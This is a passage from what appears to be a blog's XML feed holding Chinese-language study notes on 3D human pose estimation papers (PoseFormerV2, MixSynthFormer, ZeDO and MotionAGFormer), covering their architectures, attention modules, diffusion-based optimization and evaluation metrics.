RN×J×2，在很大程度上保持了原始序列的时间信息，去除了高频噪声。低频系数C′被平坦化并线性投影到zFreq ∈ RN×（J·c）（频率系数的嵌入）。zFreq与可学习的频率位置嵌入EFPos（如PoseFormerV1中的ETPos）相加。将来自时域和频率的特征连接在一起，公式为：</p><p><img src="/2024/05/23/PoseFormerV2/%E6%97%B6%E5%9F%9F%E5%92%8C%E9%A2%91%E5%9F%9F%E7%89%B9%E5%BE%81%E8%BF%9E%E6%8E%A5.png"></p><p>反馈到时频特征融合模块。</p><p><strong>时频特征融合模块</strong><br>该方法融合了时域和频域的特征。为了缩小这两个域之间的差距，我们对普通Transformer层进行了简单的修改。(1)时域和频域特征共享自关注，但使用单独的前馈网络；（2）我们在时域特征zTime的前馈网络中应用FreqMLP（频率多层感知器）（见图2（b）（c））。在我们的FreqMLP中，我们在寻常MLP之前和之后使用DCT和IDCT。<br>这种方法背后的原因是：用低通滤波器从频域特征中滤除高频噪声，但详细的人体运动特征（例如，快速局部运动）也可能作为噪声丢失。为了解决这个问题，FreqMLP充当可训练的频域滤波器，允许自适应地调整2D关节坐标嵌入中每个频率分量的权重（即，时域特征），作为频率特征的补充。</p><p><strong>所提出的方法包括三个重要的超参数，是特定于实验设置。这些参数包括在空间编码器中用作输入的帧数（f）、表示扩大的感受野的整个输入序列的长度（F）、以及用于合并长范围时间信息的保持的DCT系数的数目（n）。</strong></p><p>我们简单地设置n &#x3D; f。在实践中，它们可以进一步调整，当f等于1时，n被设置为3，因为单个DCT系数可能不足以对来自冗长输入序列的时间信息进行编码。由于f和n是固定的，因此模型的计算复杂度是预定的（即，空间编码器的令牌号和特征融合模块的令牌号是固定的）。我们可以改变F，以有效地将模型的感受野从有限的f扩展到任意值，而不会带来额外的计算开销。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MixSynthFormer</title>
    <link href="/2024/05/14/MixSynthFormer/"/>
    <url>/2024/05/14/MixSynthFormer/</url>
    
    <content type="html"><![CDATA[<p><strong>Human3.6m关键点编号</strong><br>‘hip’,  # 0<br>‘lhip’,  # 1<br>‘lknee’,  # 2<br>‘lankle’,  #<br>‘rhip’,  # 4<br>‘rknee’,  # 5<br>‘rankle’,  # 6<br>‘Spine (H36M)’,  # 7<br>‘neck’,  # 8<br>‘Head (H36M)’,  # 9<br>‘headtop’,  # 10<br>‘lshoulder’,  # 11<br>‘lelbow’,  # 12<br>‘lwrist’,  # 13<br>‘rshoulder’,  # 14<br>‘relbow’,  # 15<br>‘rwrist’,  # 16</p><p><strong>提出问题：</strong><br>问题1：视频中的人体姿态估计在各个领域都有广泛的实际应用，其中许多需要在资源稀缺的设备上进行快速推理，因此需要开发高效和准确的算法。<br>问题2：<br>以前的工作已经证明了利用运动连续性进行姿态估计使用稀疏采样帧与transformerbased模型的可行性。然而，这些方法只考虑了时间关系，而忽略了空间注意力，和点积自注意力计算的变压器的复杂性是二次成正比的嵌入大小。</p><p><strong>提出方法：</strong><br>为了解决这些限制，文章提出了MixSynthFormer，一个类似于Transformer的编码器模型，具有基于MLP的混合合成注意力。通过混合合成的空间和时间的注意力，模型结合了关节间和帧间的重要性，可以准确地估计在整个视频序列中的人体姿势从稀疏采样帧。</p><p>类似于运动完成，剩余帧中的姿态可以从关键帧姿态重构，这可以显著降低资源密集型姿态估计器的成本。</p><p>基于帧如何被馈送到模型中，姿势估计模型可以被分类为两种类型：逐帧估计器和基于关键帧的估计器。</p><p>常见的姿态估计框架估计每帧中的姿态，并通过知识蒸馏或模型结构设计来优化效率。然而，由于逐帧估计，计算成本仍然很高。此外，这些方法是敏感的遮挡情况下，部分关节是不可见的相机视图中，由于复杂的姿势或与环境的相互作用，导致不连贯的姿态，无论纳入时间信息。</p><p>相比之下，基于关键帧的姿态估计框架利用人体运动的连续性，可以产生更平滑的序列。只有关键帧用于重单帧估计，而其余帧中的姿势由轻量级模块恢复。</p><p><strong>文章要点</strong><br><img src="/2024/05/14/MixSynthFormer/Pipelines.png"><br><strong>图1</strong></p><p>基于关键帧的姿态估计框架流水线。恢复过程类似于插值。<br>(a)是基于特征的管道，它根据输入特征选择30%到40%的帧并恢复整个序列。</p><p>(b)是现有的基于采样的流水线，其使用采样器来选择帧并进行关键帧细化、全序列恢复和全序列细化。</p><p>(c)是本文提出的简化的基于采样的流水线，不包括关键帧细化。</p><p>文章提出了一个简化的recoverrefine流水线，如图1c所示。在本文的框架内，使用采样器选择关键帧，并使用采样器从关键帧中检测到的姿势中恢复姿势序列。然后使用单个细化模块对粗序列进行细化。</p><p>尽管有一系列的框架，但它们都没有将运动完成和预测视为两个相互依赖的任务。值得注意的是，运动完成和运动预测之间的唯一区别与关键帧约束有关。</p><p>文章提出了一种新的框架，利用轻量级的Transformer编码器的结构采样为基础的姿态估计。Transformer网络中的缩放点积自注意机制用于确定令牌相对于其他令牌的相对重要性。</p><p><strong>为了缓解使用大的嵌入大小时成本高的问题，文章用一个合成的自我关注模块来代替标准的关键字查询关注，该模块使用线性层来代替标准的关键字查询关注，该模块使用线性层来生成关注权重。为了提高改进的质量，文章综合了空间和时间的注意力矩阵，动态捕捉关节间和帧间的关系，来自两个维度的特征被组合并向前传递以供进一步处理。将模型命名为MixSynthFormer。</strong>（基于关键帧的姿态估计模型）</p><p>文章设计了一个基于MLP的混合合成注意力矩阵生成模块MixSynth Attention，它从输入表示中生成空间和时间上的注意力矩阵。这种设计使得模型能够动态地融合通道和令牌特征，并有效地优化姿势。为了加快计算速度，我们在注意力矩阵生成中引入了一个缩减因子，这进一步节省了计算而不影响性能。</p><p>根据关键帧的选择方式，基于关键帧的方法可以进一步分为两类：基于特征的和基于采样的。基于特征的方法选择依赖于中间特征表示的“好”关键帧，并在没有细化的情况下恢复整个序列。</p><p>基于采样的方法使用统一、随机或自定义的采样策略选择关键帧。由于所选择的帧可能不是“好的”，这些框架添加了细化模块来清除噪声姿态。</p><p><img src="/2024/05/14/MixSynthFormer/MixSynthFormer.png"><br><strong>图2</strong></p><p>MixSynthFormer从稀疏采样的关键帧中恢复和优化姿势。它由L个MixSynthEncoder块和两个线性投影层组成。MixSynthEncoder遵循标准的Transformer编码器结构，但用MixSynth Attention取代了多头自关注。MixSynth Attention通过SynthAttention操作合成空间和时间注意力（如图3所示）。两个分支的输出被合并并转发到线性层进行特征融合。（关键帧中检测到的姿势是彩色的，插值器恢复的姿势是灰色的。）</p><p>人体姿态估计本质上是一个关键点检测的项目，其目标是对身体的关键点进行检测。在这个过程中，可能会遇到关键点在连续帧之间的位置不连续或存在误差的情况。此时，插值技术可以被用来平滑这些关键点的位置，或者预测缺失的关键点位置。</p><p>具体来说，插值器可以根据已知的关键点位置，通过某种插值算法（如线性插值、多项式插值、样条插值等）来估计出未知或缺失的关键点位置。这可以帮助提高人体姿态估计的准确性和连续性。</p><p><strong>问题定义</strong>给定T帧的输入视频，采样器从每K帧（T是K的倍数）中采样一帧。采样帧被视为关键帧，其中将通过姿态估计来估计姿态。由于复杂的姿态或遮挡，从采样帧检测到的姿态可能是不可靠的。我们将从采样帧中检测到的姿态表示为Xsampled noisy ∈ R T K×P，它作为框架的输入。P是姿势参数的数量，其可以表示关节位置（2D&#x2F;3D）或旋转（6D），并且可以根据数据集和身体表示而变化。基于采样的位姿估计的目标是从采样帧中的检测位姿中恢复原始序列中的所有位姿态X ∈ RT × P（称为采样检测位姿）。</p><p><strong>模型概述</strong><br>MixSynthFormer的目标是恢复和优化姿态，以有效地获得准确的估计。最初，通过线性插值或线性层从采样的检测姿态恢复整个姿态序列。使用线性投影将这些恢复的姿势转换为姿势嵌入，并将其馈送到MixSynthEncoder的L个块中。每个MixSynthEncoder包括一个注意块和一个带有残差连接的前馈网络，后面是一个层归一化层。注意力块MixSynth Attention同时合成空间和时间注意力矩阵。通过整合空间和时间信息，我们的模型可以同时细化整个姿势序列。最后，通过另一个线性层输出恢复的姿态。</p><p><strong>MixSynthFormer结构设计</strong><br>文章采用了一个恢复细化管道。基于关键帧中检测到的姿态X，通过传统的或学习的姿态估计器沿时间维度沿着初步恢复整个姿态序列，记为x&#96;∈R T*P</p><p>从稀疏和有噪声的输入中恢复姿势会导致不准确的估计，这需要额外的处理来获得干净的输出。此外，传统的插值方法往往会产生过于平滑的运动序列，缺乏细节。</p><p>因此，细化步骤是必要的，以生成更精确的姿势序列，这可以被公式化为序列到序列的问题。Transformers在解决这些问题方面取得了显着的成功，因为它们能够捕捉令牌之间的全局相关性。除了用MixSynth Attention替换自注意模块之外，文章按照标准Transformer编码器的工作流程设计MixSynthFormer。</p><p>以下是MixSynthFormer的操作：</p><p>ˆX中的所有姿势都通过权重为W0∈Rp×C的线性层变换到姿势嵌入Z0∈RT×C，其中C是嵌入空间的维度。MixSynthEncoder的注意力层需要位置嵌入来指定输入标记的位置，而基于<strong>MLP</strong>的MixSynth注意在时间注意合成中对标记的顺序敏感，并且不需要额外的位置嵌入。</p><p><img src="/2024/05/14/MixSynthFormer/%E5%A7%BF%E6%80%81%E5%B5%8C%E5%85%A5.png"></p><p>{MLP指的是多层感知器（Multilayer Perceptron），它是一种人工神经网络（Artificial Neural Network, ANN）的类型。MLP是一种前向反馈神经网络，由多个神经元层组成，每个层与下一层全连接。</p><p>MLP至少包含三层：输入层、隐藏层（可以有多个）以及输出层。输入层负责接收原始数据，隐藏层负责对数据进行中间特征的提取，输出层负责输出最终的预测结果。在MLP中，每个神经元都与前一层的所有神经元相连，并具有权重和偏差。信息在网络中前向传播，通过乘以权重并加上偏差，然后通过激活函数进行非线性转换，从而在隐藏层和输出层之间传递。这种非线性转换使得MLP能够学习和表示复杂的非线性函数。}</p><p>姿势嵌入然后被传递到MixSynthEncode的L块中。由堆叠的MixSynth注意模块和前馈网络(FFN)组成，FFN是一个具有Gelu激活的两层逐点全连接层。在每个块之后依次应用剩余连接和层归一化(LN)。</p><p><img src="/2024/05/14/MixSynthFormer/MixSynthBlock.png"></p><p>这里，L∈[1，L]是指L的第一块。Zl−1是前一个编码块的输出，ˆZl是中间表示，Zl是当前编码块的输出。Zl和ˆZl在Rt×C中具有相同的维度。</p><p>在L个操作块之后，嵌入空间ZL中的特征通过另一个具有权重Wp ∈ RC × P的线性层被变换回姿势维度。残差连接的使用可以加快模型的收敛，并产生更稳定的结果。因此，最终恢复的姿态序列是来自MixSynthEncoder块的输出和初步恢复的噪声姿态的总和：</p><p><img src="/2024/05/14/MixSynthFormer/%E6%9C%80%E7%BB%88%E5%A7%BF%E6%80%81%E5%BA%8F%E5%88%97.png"></p><p><strong>MixSynth 注意力层</strong><br>为了学习全局和局部特征，它混合了空间和时间的合成注意力矩阵。这些矩阵中的权重反映了相对的关节间和帧间重要性。空间矩阵揭示了关节之间的相关性。当执行某些运动模式时，一起移动的关节高度相关。它有助于从相关关节中定位错误检测的关节，并进行准确检测。时间矩阵确定帧相对于序列中其他帧的影响，表示帧影响其余帧的程度。</p><p>合成注意力操作（SynthAttenOP）对Z ∈ RT×C进行操作，并输出特征Yi ∈ RT×C，其可以是空间的或时间的，分别表示为Ys和Yt。</p><p><img src="/2024/05/14/MixSynthFormer/%E5%90%88%E6%88%90%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%93%8D%E4%BD%9C.png"></p><p>同时生成空间和时间关注的特征。应用分裂注意力来重新平衡两个分支的贡献。不同的议案可以有不同的重点。关节间关系对于某些运动更重要，而其他运动可能更多地受到帧间关系的影响。Ys和Yt的权重Ay ∈ R2×C计算为：</p><p><img src="/2024/05/14/MixSynthFormer/%E6%9D%83%E9%87%8D%E8%AE%A1%E7%AE%97.png"></p><p>其中GAP表示全局平均池化函数，FFN包含两个具有ReLU激活的全连接层，Softmax用于归一化。加权和Yout ∈ RT×C是来自两个分支的级联表示与重新平衡权重Ay的逐元素乘积的总和：</p><p><img src="/2024/05/14/MixSynthFormer/%E6%9D%83%E9%87%8D%E8%BE%93%E5%87%BA.png"></p><p>MixSynth Attention块的输出通过用权重Wo ∈ RC×C线性变换Yout来获得：</p><p><img src="/2024/05/14/MixSynthFormer/MixSynth%E6%B3%A8%E6%84%8F%E5%8A%9B%E8%BE%93%E5%87%BA.png"></p><p><strong>SynthAttention</strong></p><p><img src="/2024/05/14/MixSynthFormer/SynthAttenOp.png"><br><strong>图3</strong></p><p>transformers中的自注意模块利用成对点积计算注意权重。查询密钥矩阵乘法的计算随着嵌入大小的增加而二次扩展。为了减轻嵌入大小对计算成本的影响，文章提出了合成注意力操作（SynthAttenOp），其计算量随着嵌入大小的增加而线性增长，作为标准注意力的替代品。SynthAttenOP使用线性层生成注意力矩阵。</p><p>SynthAttenOp在空间上和时间上运行。在空间注意合成中，输入和输出是互换的。这里我们用Z ∈ RN×D来说明一般情况，其中N和D可以用C或T代替。粗合成注意力矩阵As ∈ RN×N由具有权重Wz ∈ RD×N的线性层生成：</p><p><img src="/2024/05/14/MixSynthFormer/%E5%90%88%E6%88%90%E6%B3%A8%E6%84%8F%E5%8A%9B%E7%9F%A9%E9%98%B5.png"></p><p>由于不同的框架或关节有不同的贡献，我们应用挤压和激发层（SELayer）来调节影响。它可以放大关键通道，同时减轻不太重要的影响。细粒度的注意力矩阵Asynth ∈ RN×N由以下公式获得：</p><p><img src="/2024/05/14/MixSynthFormer/%E7%BB%86%E7%B2%92%E5%BA%A6%E7%9F%A9%E9%98%B5.png"></p><p>其中GAP表示全局平均池化，GAP（A）∈ RN，δ和σ是Sigmoid激活和ReLU函数。减少比（rse）是一个经验发现的超参数，限制了模型的复杂性。Ws ∈ RN rse ×N是降维的，We ∈ RN× N rse是扩展到原始维数的.SELayer的输出是在与计算的权重逐通道相乘之后的重新缩放的输入。Softmax继承自标准的Transformer，它对注意力权重进行了归一化。与标准的Transformer编码器一致，输出是注意力矩阵和值的乘积：</p><p><img src="/2024/05/14/MixSynthFormer/%E6%B3%A8%E6%84%8F%E5%8A%9B%E7%9F%A9%E9%98%B5%E5%92%8C%E5%80%BC%E7%9A%84%E4%B9%98%E7%A7%AF.png"></p><p>其中V &#x3D; Z ∈ RN × D且Y ∈ RN × D。上述方法适用于N相对较小的情况。当N较大时，由于等式n中的矩阵乘法，计算成本呈二次方增长。文章将缩减因子r应用于最后一个维度D，从而节省了等式中的计算。将降维表示为d &#x3D; N&#x2F;r。图3显示了简化注意力矩阵生成和特征融合的过程。通过下式获得约简的粗注意矩阵Ar s ∈ RN × d和约简值Vr ∈ Rd × D：</p><p><img src="/2024/05/14/MixSynthFormer/%E7%B2%97%E6%B3%A8%E6%84%8F%E5%8A%9B%E7%9F%A9%E9%98%B5.png"></p><p>其中，用于减少注意力矩阵生成的权重和用于减少值的权重分别为Wrz ∈ RD×d和Wv ∈ Rd×N。</p><p>SELayer，即Squeeze-and-Excitation（SE）模块，是深度学习中的一种注意力机制模块，最初是在2017年由Hu等人提出的SENet（Squeeze-and-Excitation Networks）中引入的。SE模块的主要目标是通过显式地建模卷积特征通道之间的相互依赖关系来提高模型的表示能力。</p><p>SE模块主要由两部分组成：</p><p>Squeeze操作：这部分通过对每个通道的全局空间特征进行压缩（如通过全局平均池化）来得到一个通道描述符，该描述符能够捕获全局上下文信息。<br>Excitation操作：这部分使用一个简单的门控机制（如一个全连接层或两个全连接层组成的瓶颈结构），基于Squeeze操作得到的通道描述符来生成每个通道的调制权重。这些权重随后被用于重新校准（或缩放）原始特征图。<br>通过SE模块，模型能够学习到哪些通道是重要的并应该被强调，哪些通道是不重要的并应该被抑制。这种机制有助于提高模型的性能，特别是在处理具有复杂空间依赖关系的任务时。</p><p><strong>评估指标</strong><br>对于2D姿态估计，使用正确关键点百分比（PCK），并设置三个阈值（像素级下的边界框大小的20%、10%和5%）。对于3D任务，平均每关节位置误差（MPJPE）用于报告距离误差，平均加速度误差（Accel）用于反映估计的位姿序列的平滑性。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Back to Optimization</title>
    <link href="/2024/05/11/Back-to-Optimization/"/>
    <url>/2024/05/11/Back-to-Optimization/</url>
    
    <content type="html"><![CDATA[<p><strong>提出问题</strong><br>基于学习的方法在3D人体姿态估计（HPE）任务中占主导地位，在大多数基准测试中的性能明显优于传统的基于优化的方法。尽管如此，3D HPE仍然是基于学习的模型面临的最大挑战，基于学习的3D HPE方法在跨域或野外场景中会出现性能下降。无论是2D-3D提升，图像到3D还是基于扩散的方法，因为经过训练的网络隐式地学习相机内部参数和基于域的3D人体姿势分布，并通过统计平均值估计姿势。虽然基于学习的方法在3D HPE任务中取得了显著的成功，但它们受到训练数据集的高度限制。换句话说，当在其他数据集上测试时，由于域间隙，它们的性能会突然下降。</p><p><strong>提出方法</strong><br>基于优化的方法逐个案例地估计结果，这可以预测野外更多样化和复杂的人类姿势。结合基于优化和基于学习的方法的优点，提出了基于零次扩散的3D HPE优化流水线（Zero-shot Diffusion-based Optimization，ZeDO），以解决跨域和野外的3D HPE问题。</p><p><strong>实验性能</strong><br>最小MPJPE为51.4mm，无需使用任何2D-3D或图像-3D对进行训练。<br>此外，单假设ZeDO在跨数据集评估中使用PA-MPJPE 40.3mm在3DPW数据集上实现了SOTA性能，甚至优于在3DPW上训练的基于学习的方法。</p><p>与传统的基于优化的方法不同，传统的基于优化的方法包括各种运动学约束，扩散模型迭代地对优化管道的输出进行降噪，以确保优化的姿势符合人体约束。同时，通过使用简单而有效的优化流水线最小化2D关键点重投影误差来优化姿态。因此，ZeDO能够估计3D人体姿势，而无需对任何2D—3D或图像—3D对进行训练。<br><strong>文章贡献</strong><br>**.**所提出的ZeDO流水线是Zero-Shot 3D人体姿势估计流水线，其利用预先训练的基于扩散的3D人体姿势生成模型来在推理时间期间优化循环中的目标3D姿势。</p><p>**.**与其他生成和去噪任务相比，文章将扩散模型作为优化工具，将简单的3D HPE优化管道与预先训练的基于扩散的3D人体姿势生成模型相结合。</p><p>**.**ZeDO在Human3.6M、3DHP和3DPW数据集上实现了最先进的零拍摄3D HPE性能，甚至在交叉数据集评估上也是如此。</p><p><strong>文章要点</strong><br>基于优化的方法，估计3D姿态逐帧和逐例，不受域间隙或变化的相机内部参数的限制。<br>2D-3D提升网络采用单个帧或归一化2D关键点序列作为输入，以生成相应的3D关键点。<br>端到端3D HPE方法直接将图像数据转换为3D姿态表示</p><p><img src="/2024/05/11/Back-to-Optimization/ZeDO%E7%AE%A1%E9%81%93.png"><br><strong>图1</strong><br>如图1所示，ZeDO包括用于旋转初始姿态的初始姿态优化器和用于迭代优化3D姿态的循环中的优化器。</p><p>首先，随机选择的初始3D姿态（假设）Pinit ∈ RJ×3通过利用检测到的或真实的2D关键点p2d ∈ RJ×2最小化重新投影误差而被旋转到最佳姿态P0。这里，<strong>J代表关键点的数量</strong>。<br>然后，在第i个优化步骤中，Pi由优化器在循环中优化，并且使用预训练的扩散模型将其降噪到Pi+1作为下一次迭代的输入。在n次迭代之后，Pn将是估计的3D人体姿势。与其他基于扩散的姿势估计方法不同，我们的扩散模型θg是一个<strong>姿势生成模型</strong>，它只使用3D人体姿势进行训练，并且在推理过程中，我们的扩散模型只将优化的姿势ePi和时间戳t（i）作为输入，而没有任何额外的姿势条件信息，包括2D姿势。</p><p>基于噪声条件得分网络（NCSN）的学习策略，通过选择λ（t）&#x3D; σ（t）2来表示我们的损失函数如下：<br><img src="/2024/05/11/Back-to-Optimization/%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0.png"></p><p>其中z代表随机噪声向量z &lt;$N（0，1），sθ是预训练的分数匹配网络。σ表示等式中提到的方差。作为[1-e-Rt 0 β（s）ds]，并且时间戳或去噪时间变量t从（0，1）均匀采样1000次。3D姿态生成模型从不使用任何2D-3D或图像-3D对进行训练。我们报告了基于分数匹配的模型的结果，类似于GFPose。</p><p><strong>初始姿势优化器</strong><br>文章的优化管道从初始姿势Pinit开始。如图2所示，如果初始姿态的取向显著不同于目标姿态的取向或者甚至垂直于目标姿态的取向，则优化姿态可能是不够的。因此，初始姿态优化器被设计为通过最小化2D关键点p2d的重新投影误差来找到Pinit的最佳旋转矩阵R0 ∈ SO（3）和平移T0。<br><img src="/2024/05/11/Back-to-Optimization/%E5%88%9D%E8%AF%95%E5%A7%BF%E6%80%81%E4%BC%98%E5%8C%96%E8%BF%87%E7%A8%8B.png"><br><strong>图2</strong></p><p><img src="/2024/05/11/Back-to-Optimization/%E5%A7%BF%E6%80%81%E6%97%8B%E8%BD%AC%E7%AD%89%E5%BC%8F.png"></p><p>在旋转之后，P0 &#x3D; RoPinit是发送到迭代优化流水线的最佳姿态。如图2所示，旋转优化将初始姿态与目标2D和3D姿态对准。（将旋转轴限制在z轴上）</p><p><strong>迭代优化器</strong><br>文章的迭代优化器利用姿态生成扩散模型的去噪能力和学习的人体姿态先验，以简单而有效的优化管道来估计准确的3D人体姿态，而无需任何显式运动学约束。利用摄像机固有矩阵K，可以基于透视投影将2D关键点p2d转换为3D射线r ∈ Rx3，<br><img src="/2024/05/11/Back-to-Optimization/%E4%BC%98%E5%8C%96%E7%AE%A1%E9%81%93%E4%BC%B0%E8%AE%A1%E5%A7%BF%E6%80%81%E7%AD%89%E5%BC%8F.png"><br><img src="/2024/05/11/Back-to-Optimization/%E6%8A%95%E5%BD%B1%E7%AD%89%E5%BC%8F.png"></p><p>直观地，如图3所示，将3D关键点从Po投影到r将使2D重新投影误差最小化并提供估计的3D人类姿势。</p><p><img src="/2024/05/11/Back-to-Optimization/%E4%BC%B0%E8%AE%A1%E4%BA%BA%E4%BD%933D%E5%A7%BF%E6%80%81.png"><br><strong>图3</strong></p><p><img src="/2024/05/11/Back-to-Optimization/%E8%BF%AD%E4%BB%A3%E7%AE%97%E6%B3%95.png"></p><p>从你给出的要求和伪代码片段中，可以推断出一个基于扩散模型的迭代优化方法来估计3D人体姿态的过程。这里的关键是结合了初始的3D姿态估计、2D姿态检测、2D姿态的置信度、相机内参以及一个预训练的扩散模型来迭代地优化和去噪3D姿态。</p><p>以下是基于你提供的伪代码的一个更详细的解释和扩展：</p><p>初始化：<br>给定初始的3D姿态 Pinit、目标2D姿态 p2d、2D姿态的置信度 C2d、相机内参 K 和一个扩散时间戳 t。<br>使用最小二乘法（或其他优化方法）找到最优的旋转矩阵 R0 和平移向量 T0，使得经过 R0 和 T0 变换后的 Pinit 在相机坐标系下的投影最接近 p2d。<br>使用找到的 R0 和 T0 对 Pinit 进行变换，得到初始的3D姿态估计 P0。</p><p>迭代优化和去噪：<br>定义一个单位射线向量 ˆr，它是通过将目标2D姿态 p2d 通过相机内参 K 的逆矩阵 K−1 变换到相机坐标系下并归一化得到的。<br>迭代地执行以下步骤 n 次（其中 n 是预设的迭代次数）：<br>如果当前迭代次数 i 小于一个“预热”迭代次数 warmup（用于确保在扩散过程的早期阶段稳定性），则使用初始的平移向量 T0。<br>否则，通过优化找到平移向量 Ti，以最小化2D姿态的置信度加权投影误差。这考虑了不同2D关键点可能具有不同的置信度。<br>将当前的3D姿态 Pi 和平移向量 Ti 投影到射线 ˆr 上，得到一个沿射线的3D点 Pei。这可以看作是沿着从相机中心出发并指向目标2D姿态的射线的3D姿态的一个估计。<br>（伪代码中缺失了 Pi+1 的具体计算步骤，但通常这里会使用预训练的扩散模型 θg(P, t) 和当前的迭代次数或时间戳 t 来生成或去噪一个新的3D姿态 Pi+1。这个步骤可能还涉及将 Pei 作为条件或约束来使用。）</p><p>输出：<br>经过 n 次迭代后，输出最终的3D姿态估计 Pn。</p><p>Pi：当前迭代的3D姿态估计。<br>Ti：当前迭代中用于最小化投影误差的平移向量。<br>ˆr：单位射线向量，从相机中心指向目标2D姿态。<br>θg(ePi, t(i))：预训练的扩散模型，用于从噪声姿态ePi和当前时间戳t(i)生成去噪后的姿态。<br>迭代优化和去噪的详细过程如下：</p><p>计算沿射线的3D点：<br>通过当前的3D姿态估计Pi和平移向量Ti，我们计算沿射线ˆr方向上的一个3D点Pei。这是通过将(Pi + Ti)投影到射线ˆr上，并从结果中减去Ti来完成的。这确保了Pei位于从相机中心出发并指向目标2D姿态的射线上。</p><p>数学上，这可以表示为：</p><p>Pei &#x3D; ((Pi + Ti) · ˆr) · ˆr - Ti<br>这里，(Pi + Ti) · ˆr计算了点(Pi + Ti)在射线ˆr方向上的投影长度，然后乘以单位射线向量ˆr得到投影点的坐标。最后，从这个投影点中减去Ti得到Pei。</p><p>生成噪声姿态（假设步骤，因为伪代码中未明确给出）：<br>通常，扩散模型需要一个噪声版本的输入来生成去噪后的输出。因此，在将Pei作为输入传递给扩散模型之前，可能需要生成一个噪声姿态ePi。这可以通过在Pei上添加噪声来实现，但具体的噪声生成方法取决于所使用的扩散模型。</p><p>使用扩散模型去噪：<br>将噪声姿态ePi（或可能是Pei本身，如果不需要额外的噪声）和当前迭代的时间戳t(i)传递给预训练的扩散模型θg。扩散模型根据这些输入生成一个去噪后的3D姿态Pi+1。</p><p>数学上，这可以表示为：</p><p>Pi+1 &#x3D; θg(ePi, t(i))<br>或者如果直接使用Pei（取决于具体实现）：</p><p>Pi+1 &#x3D; θg(Pei, t(i))<br>更新迭代：<br>使用新的去噪姿态Pi+1作为下一次迭代的起点，并重复上述过程，直到达到预设的迭代次数n。</p><p>然而，存在两个问题：<br>1）简单地将3D关键点从P0投影到r生成有噪声的3D人体姿势，其可能不满足人体的运动学约束。</p><p>2)P0和摄像机之间的平移不同，投影结果也不同。为了解决这两个问题，我们需要确保估计的3D姿态Pi是有效的姿态，并且内在地遵循运动学约束以找到最佳平移Ti。这就要求我们使用pose prior。</p><p>虽然优化的姿态不存在重新投影误差，但是优化的姿态可能不满足运动学约束。我们利用预先训练的基于扩散的姿势生成模型来“降噪”我们的优化姿势。如DDPM ，DDIM 和Score Matching network 中所述，通过最大化似然来训练扩散模型，其目的是基于输入噪声姿态找到最可能的有效姿态。因此，我们使用基于扩散的姿势生成模型来基于优化的姿势Pi找到最佳Pi+1。</p><p>采用截断扩散模型推理，其时间戳在推理过程中从训练时间戳中截断。在我们的例子中，时间戳t被截断为t ∈（0，0.1），而不是（0，1）。</p><p>最佳平移是通过最小化Pi的2D重新投影误差从To导出的，这取决于当前迭代次数，因为优化的姿态Pi在早期迭代中不够可靠。在某些迭代之后，从以下公式推导出最佳翻译：</p><p><img src="/2024/05/11/Back-to-Optimization/%E6%9C%80%E4%BD%B3%E7%BF%BB%E8%AF%91%E7%AD%89%E5%BC%8F.png"></p><p>其中，C2d ∈ RJ是2D关键点的置信度得分，p2d和K是相机固有矩阵。C2d有助于指导翻译优化。通过结合最佳平移和运动学约束，可以通过迭代地将Pi投影到r并在扩散模型的帮助下对投影的Pi+1进行去噪来优化3D人体姿势。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>motionAGFormer</title>
    <link href="/2024/05/07/motionAGFormer/"/>
    <url>/2024/05/07/motionAGFormer/</url>
    
    <content type="html"><![CDATA[<p><strong>面临问题</strong><br>最近的基于变换的方法在3D人体姿态估计中表现出优异的性能。然而，它们具有整体视图，并且通过编码所有关节之间的全局关系，它们不能精确地捕获局部依赖性。</p><p><strong>提出的解决方法</strong><br>在本文中，文章提出了一种新的注意力GCNFormer（AGFormer）块，划分的通道数量，通过使用两个并行的Transformer和GCNFormer流。文章提出的GCNFormer模块利用相邻关节之间的局部关系，输出一个新的表示，是互补的Transformer输出。通过以自适应的方式融合这两种表示，AGFormer具有更好地学习底层3D结构的能力。</p><p><strong>实验结果</strong><br>Human3.6M和MPI-INF-3DHP。MotionAGFormer-B实现了最先进的结果，P1误差分别为38.4 mm和16.2 mm。</p><p>该领域的关键挑战之一是有效地将这些2D序列提升到3D空间中。最初为NLP任务设计的Transformer架构已适用于各种计算机视觉问题，包括姿态估计。它捕获远程依赖关系的能力及其固有的自我注意力机制使其成为该领域的一个有前途的候选者。<strong>人体运动具有内在的局部空间和时间依赖性。</strong></p><p>在文中，MotionAGFormer利用变压器的力量来捕获全局信息，同时采用图形卷积网络（GCN）来集成本地空间和时间关系。文章使用自适应融合来聚合来自Transformer和图形流的特征。通过这样做，确保了人体运动的平衡和全面的表示，从而提高了3D姿态估计的准确性。</p><p><img src="/2024/05/07/motionAGFormer/%E5%85%AC%E5%BC%8F1.png"><br>其中，Norm（·）表示一种规范化方法，例如批处理或层规范化，TokenMixer（·）表示一个模块，用于组合令牌之间的信息。我们的方法使用两个并行的令牌混合器：多头自注意（MHSA）和图卷积网络（GCN），每个都对信息转换过程做出独特的贡献。</p><p>文章提出了MotionAGFormer架构，它使用注意力（Transformer）和图形卷积（GC NFormer）来提升运动序列。<br><img src="/2024/05/07/motionAGFormer/MotionAGFormer.png"><br><strong>图2</strong></p><p>该模型采用置信度为X ∈ RT×J×3的二维输入序列，其中T和J分别表示帧数和关节数。然后，它继续使用线性投影层将每个时间帧中的每个关节映射到d维特征F（0）∈ RT×J×d。然后将空间位置嵌入Ps pos ∈ R1×J×d添加到令牌。这里需要强调的是，我们的模型并没有忽略时间标记顺序，因为该信息保留在GCNFormer流中。<br>在位置嵌入之后，我们使用AGFormer的N个块（第3.3节）来计算F（i）∈ RT × J × d（i &#x3D; 1，…，N）以有效地捕获骨架序列的底层3D结构。最后，我们通过应用线性层和tanh激活来计算运动语义M ∈ RT × J × d ′，并使用回归头来估计3D姿态P ∈ RT × J × 3，从而将F（N）映射到更高的维度。升力损失包含位置（L3D）和速度（L P）项，定义为：<br><img src="/2024/05/07/motionAGFormer/%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0.png"></p><p>式中，Pt &#x3D; Pt − Pt − 1，Pt &#x3D; Pt − Pt − 1。总升力损失定义为：<br><img src="/2024/05/07/motionAGFormer/%E6%80%BB%E6%8D%9F%E5%A4%B1.png"></p><p><strong>AGFormer Block</strong><br>AGFormer块使用双流架构。每个流由两个组件组成：空间MetaFormer（图2b）和时间MetaFormer（图2c）。Spatial 